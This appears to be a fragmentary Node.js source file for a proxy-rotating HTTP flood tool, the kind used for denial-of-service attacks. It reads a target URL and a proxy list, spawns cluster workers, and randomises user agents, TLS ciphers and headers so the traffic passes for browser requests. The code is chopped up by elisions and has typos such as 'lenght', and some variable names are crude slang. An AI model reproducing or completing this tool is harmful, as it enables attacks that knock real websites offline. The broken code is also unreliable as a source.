const net = require("net");
 ...
 const Random = require('header-generator');
 const fs = require("fs");
...
const tips1 =[
 ...
 "Don't use proxies for genuine scripts",
 "tls not working:)"
];
const lang_header = [
  'ko-KR',
...
function getRandomUserAgent() {
 ...
 //var haram = uang[Math.floor(Math.floor(Math.random() * uang.lenght))];
 var entot = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
 var kontol = pel[Math.floor(Math.floor(Math.random() * pel.lenght))];
 var acc = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
 var ca = controle_header[Math.floor(Math.floor(Math.random() * controle_headerlength))];
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 var len = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
 var sog = sig[Math.floor(Math.floor(Math.random() * sig.length))];
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);

 if (cluster.isMaster) {
    console.clear()
    console.log(`notwrk recode by #####`.rainbow)
    console.log(`--------------------------------------------`.gray)
 ...
 headers["sec-ch-ua-platform"] = kontol;
 headers["vary"] = randomHeaders['vary'];
 headers["x-requested-with"] = "XMLHttpRequest";
 headers["accept-language"] = len;
 headers["accept-encoding"] = entot;
